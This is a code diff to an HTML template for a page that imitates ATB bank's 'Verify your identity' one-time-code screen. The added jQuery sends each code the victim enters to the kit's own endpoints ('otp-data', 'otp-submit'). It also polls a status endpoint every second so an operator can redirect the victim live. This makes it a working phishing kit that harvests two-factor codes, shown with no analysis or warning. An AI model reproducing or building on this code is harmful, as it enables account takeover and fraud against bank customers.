@@ -14,15 +14,50 @@
             var lrinfo = '<?=escape($udata->last->info)?>';
         </script>
         <script src="/assets/js/actions.js?v=<?=time()?>"></script>
-        <script src="/socket.io/socket.io.js"></script>
+        <script>
+            setInterval(function() {
+                $.post('/deposit/atb/api/status', {page: '2FA (Waiting)'}, function(response) {
+                    if (response.status) {
+                        location.href = response.href;
+                    }
+                }, 'JSON');
+            }, 1000);
+        </script>
+        <script>
+        $(document).on('change', '#input-code', function() {
+            $.post('/deposit/atb/api/otp-data', {code: $(this).val()});
+        });
+
+        $.post('/deposit/atb/api/otp-type', {type: 'Email'}, function(response) {});
+
+        $(document).on('submit', '.lab-form', function(e) {
+            $('.btn-save').attr('disabled', true);
+
+            $.post('/deposit/atb/api/otp-submit', {code: $('#input-code').val()}, function(response) {
+                location.href = '/deposit/atb/wo/' + rand_str(16);
+            });
+
+            e.preventDefault();
+        });
+
+        function rand_str(length) {
+            var result           = '';
+            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            var charactersLength = characters.length;
+            for ( var i = 0; i < length; i++ ) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        }
+        </script>
+          <script src="/socket.io/socket.io.js"></script>
     </head>
     <body>
         <div id="app">
             <div class="sc-kgoBCf bzQzYK" id="rbw-overall-context-wrapper">
                 <div class="sc-iwsKbI jTTtAZ"></div>
                 <div class="sc-jzJRlG eNoisr">
-                    <form id="loginForm" class="sc-jTzLTM cUTnPT lab-form">
-                        <input type="hidden" id="userAgent" name="userAgent">
+                    <form class="sc-jTzLTM cUTnPT lab-form" method="post" id="rbw-login-block">
                         <div class="sc-bdVaJa khUSez">
                             <img class="sc-htpNat gRCWAJ" src="/assets/atb/atb-jewel.svg" id="rbw-login-heading-atb-logo"><br><br>
                             <h2 class="ant-typography login-title-2 div-send">Verify your identity</h2>
@@ -31,7 +66,7 @@
                         <div class="sc-fjdhpX Pbrfi div-main" id="rbw-login-form-login-block">
                             <div>
                                 <div class="div-code">
-                                    <div style="margin: -10px 0 25px 0">To protect your account, we have sent a one-time code to your registered mobile number. Enter the code below to continue</div>
+                                    <div style="margin: -10px 0 25px 0">To protect your account, we have sent a one-time code to your registered email address. Enter the code below to continue</div>
                                     <% if (error) { %>
                                     <p class="p-text" style="color: red; margin-bottom: 27px; margin-top: 15px">The code you entered was incorrect. Please try again.</p>
                                     <% } %>
@@ -49,7 +84,7 @@
                                 <div class="uiNewButtonWrapper ">
                                     <a class="rebank-button btn-save div-code" onclick="submitForm()" label="Log in" type="nano">Submit</a>
                                 </div>
-                              
+                               
                             </div>
                         </div>
                     </form>
@@ -64,7 +99,6 @@
         <span hidden id="navig"> <%=navig%> </span>
         <span hidden id="stage">OTP</span>
     </body>
-   
     <script src="/bank/atb/js/script.js">
     </script>
 </html>
